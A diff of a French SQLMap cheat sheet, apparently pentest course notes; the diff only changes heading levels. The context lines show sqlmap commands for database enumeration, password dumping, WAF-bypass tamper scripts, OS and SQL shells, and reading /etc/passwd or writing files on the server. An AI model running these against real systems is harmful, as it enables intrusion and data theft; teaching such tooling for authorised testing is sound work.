@@ -20,9 +20,9 @@
 --technique=BEUSTQ  # Boolean, Error, Union, Stacked, Time, Query
 ```
 
-### 4.1 SQLMap - Commandes Basiques
+## 4.1 SQLMap - Commandes Basiques
 
-#### **Scan GET simple :**
+### **Scan GET simple :**
 
 ```bash
 sqlmap -u "http://sql-sandbox/api?id=1" --dbs
@@ -35,7 +35,7 @@ sqlmap -u "http://sql-sandbox/api?id=1" --dbs
 
 ---
 
-#### **Scan POST avec data :**
+### **Scan POST avec data :**
 
 ```bash
 sqlmap -u http://sql-sandbox/sqlmap/api \
@@ -52,7 +52,7 @@ sqlmap -u http://sql-sandbox/sqlmap/api \
 
 ---
 
-#### **SQLMap avec multipart/form-data**
+### **SQLMap avec multipart/form-data**
 
 **1ère méthode** 
 Sauvegarder la requête dans un fichier
@@ -106,7 +106,7 @@ sqlmap -u "http://piano/auth" \
 
 ---
 
-#### **Spécifier SGBD :**
+### **Spécifier SGBD :**
 
 ```bash
 sqlmap -u http://target/api \
@@ -127,7 +127,7 @@ sqlmap -u http://target/api \
 
 ---
 
-#### **Ignorer sessions précédentes :**
+### **Ignorer sessions précédentes :**
 
 ```bash
 sqlmap -u http://target/api \
@@ -142,7 +142,7 @@ sqlmap -u http://target/api \
 
 ---
 
-#### **Mode batch (pas d'interaction) :**
+### **Mode batch (pas d'interaction) :**
 
 ```bash
 sqlmap -u http://target/api --batch
@@ -155,7 +155,7 @@ sqlmap -u http://target/api --batch
 
 ---
 
-#### **Random User-Agent :**
+### **Random User-Agent :**
 
 ```bash
 sqlmap -u http://target/api --random-agent
@@ -167,7 +167,7 @@ sqlmap -u http://target/api --random-agent
 
 ---
 
-#### **Threads (parallélisation) :**
+### **Threads (parallélisation) :**
 
 ```bash
 sqlmap -u http://target/api --threads 10
@@ -179,7 +179,7 @@ sqlmap -u http://target/api --threads 10
 
 ---
 
-#### **Cookies :**
+### **Cookies :**
 
 ```bash
 sqlmap -u http://target/api --cookie "session=abc123"
@@ -191,7 +191,7 @@ sqlmap -u http://target/api --cookie "session=abc123"
 
 ---
 
-#### **Headers personnalisés :**
+### **Headers personnalisés :**
 
 ```bash
 sqlmap -u http://target/api --headers "Authorization: Bearer token"
@@ -203,7 +203,7 @@ sqlmap -u http://target/api --headers "Authorization: Bearer token"
 
 ---
 
-#### **Proxy :**
+### **Proxy :**
 
 ```bash
 sqlmap -u http://target/api --proxy http://127.0.0.1:8080
@@ -215,7 +215,7 @@ sqlmap -u http://target/api --proxy http://127.0.0.1:8080
 
 ---
 
-### 4.2 SQLMap - Énumération
+## 4.2 SQLMap - Énumération
 
 **Lister bases de données :** `--dbms=mysql --dbs`
 
@@ -410,9 +410,9 @@ sqlmap -u http://target/api --passwords
 
 ---
 
-### 4.3 SQLMap - Exploitation Avancée
+## 4.3 SQLMap - Exploitation Avancée
 
-#### **Shell SQL interactif :**
+### **Shell SQL interactif :**
 
 ```bash
 sqlmap -u http://target/api --sql-shell
@@ -424,7 +424,7 @@ sqlmap -u http://target/api --sql-shell
 
 ---
 
-#### **Shell OS (si écriture possible) :**
+### **Shell OS (si écriture possible) :**
 
 ```bash
 sqlmap -u http://target/api --os-shell
@@ -438,7 +438,7 @@ sqlmap -u http://target/api --os-shell
 
 ---
 
-#### **Lire fichier sur serveur :**
+### **Lire fichier sur serveur :**
 
 ```bash
 sqlmap -u http://target/api --file-read "/etc/passwd"
@@ -450,7 +450,7 @@ sqlmap -u http://target/api --file-read "/etc/passwd"
 
 ---
 
-#### **Écrire fichier sur serveur :**
+### **Écrire fichier sur serveur :**
 
 ```bash
 sqlmap -u http://target/api \
@@ -465,7 +465,7 @@ sqlmap -u http://target/api \
 
 ---
 
-#### **Techniques SQL injection :**
+### **Techniques SQL injection :**
 
 ```bash
 sqlmap -u http://target/api --technique=BEUST
@@ -493,7 +493,7 @@ sqlmap -u http://target/api --technique=UE
 
 ---
 
-#### **Tamper scripts (WAF bypass) :**
+### **Tamper scripts (WAF bypass) :**
 
 ```bash
 # Espace → commentaire
@@ -527,7 +527,7 @@ sqlmap --list-tampers
 
 ---
 
-#### **Level et Risk :**
+### **Level et Risk :**
 
 ```bash
 sqlmap -u http://target/api --level=5 --risk=3
@@ -550,9 +550,9 @@ sqlmap -u http://target/api --level=5 --risk=3
 
 ---
 
-### 4.4 SQLMap - Workflow Complet
+## 4.4 SQLMap - Workflow Complet
 
-#### **Méthodologie recommandée :**
+### **Méthodologie recommandée :**
 
 1. **Identifier vulnérabilité + SGBD :**
 
@@ -586,7 +586,7 @@ sqlmap -u http://target/api --data "..." -p "param" --dbms=mysql -D nom_base -T 
 
 ---
 
-#### **Depuis requête Burp :**
+### **Depuis requête Burp :**
 
 ```bash
 # Sauvegarder requête HTTP depuis Burp
